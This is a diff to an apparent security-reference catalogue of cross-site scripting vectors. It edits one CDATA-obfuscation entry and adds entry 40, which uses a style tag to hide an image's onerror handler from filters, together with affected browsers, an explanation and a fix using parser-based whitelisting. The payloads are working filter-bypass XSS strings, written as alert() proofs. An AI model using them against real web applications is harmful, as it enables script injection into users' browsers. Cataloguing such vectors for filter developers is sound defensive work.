@@ -1186,7 +1186,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<![><img src="]><img src=x onerror=alert(3)//">',
+        'data'       : '<![><img src="]><img src=x onerror=%js_alert%//">',
         'description': {
             'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation.',
             'jp' : '',
@@ -1205,6 +1205,39 @@ var items =
             'firefox' : ['1.x', '2.x', '3.x'], 
         },
         'tags'       : ['xss', 'javascript', 'cdata', 'parsing', 'attributes'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 40 - Plaintext tags used for markup obfuscation  */
+        'id'         : 40,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Plaintext tags used for markup obfuscation',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<style><img src="</style><img src=x onerror=alert(1)//">',
+        'description': {
+            'en' : 'This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image\'s "src" attribute and accept the incoming data.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'Don\'t rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
+            'opera': ['8.x', '9.x', '10.x'], 
+            'firefox' : ['1.x', '2.x', '3.x'], 
+            'chrome': ['2.x', '3.x', '4.x', '5.x'],
+            'safari': ['3.x', '4.x']
+        },
+        'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
         'reporter'   : 'LeverOne'
     }
 ]
